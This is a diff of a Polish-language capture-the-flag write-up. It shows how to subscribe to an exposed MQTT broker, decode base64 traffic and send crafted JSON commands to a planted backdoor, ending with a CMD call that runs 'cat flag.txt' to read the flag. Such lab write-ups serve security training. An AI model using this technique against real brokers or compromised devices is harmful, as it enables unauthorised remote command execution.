@@ -44,7 +44,9 @@ Najpierw zainstalowałem `sudo apt install mosquitto-clients -y` w celu połącz
 - -t "#" subskrybcja do wszystkich urządzeń ("#" - wildcard)
 - -v - verbose
 ![](Attachments/{5DD94985-6A5A-4675-853C-52576A80DBAD}.png)
+
 W danych zdobytych z połączenia do brokera widać zakodowaną wiadomość w base64, po odkodowaniu dostajemy dla urządzenia `yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config`:
+
 ```
 {
   "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
@@ -62,21 +64,25 @@ W celu nasłuchiwania tylko dla urządzeń związanych z tymi poleceniami:
 `mosquitto_sub -h 10.10.161.204 -p 1883 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -v`
 
 Wysłanie wiadomości daje następujący wynik:
+
 ![](Attachments/{3F255807-DA51-410A-95DD-C62111676ADC}.png)
 
 Odkodowanie otrzymanej wiadomości po wysłaniu "HELP"
+
 ```
 Invalid message format.
 Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
 ```
 
 Wysłanie wiadomości `{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "HELP", "arg": ""}` w base64 daje taką odpowiedź 
+
 ```
 {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:\n    Base64({\n        \"id\": \"<Backdoor ID>\",\n        \"cmd\": \"<Command>\",\n        \"arg\": \"<arg>\",\n    })\n\nCommands:\n    HELP: Display help message (takes no arg)\n    CMD: Run a shell command\n    SYS: Return system information (takes no arg)\n"}
 ```
 
 
 Wysłanie wiadomości `{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "SYS", "arg": ""}` w base64 daje taką odpowiedź 
+
 ```
 {"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Linux x64 5.15.0-139-generic"}
 ```
@@ -87,6 +93,7 @@ Po wysłaniu wiadomości w base64
 `{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}`
 
 Otrzymujemy flagę:
+
 ![](Attachments/{43D29C7A-532F-4DCA-A84C-A0758C342045}.png)
 
 # **Flag**
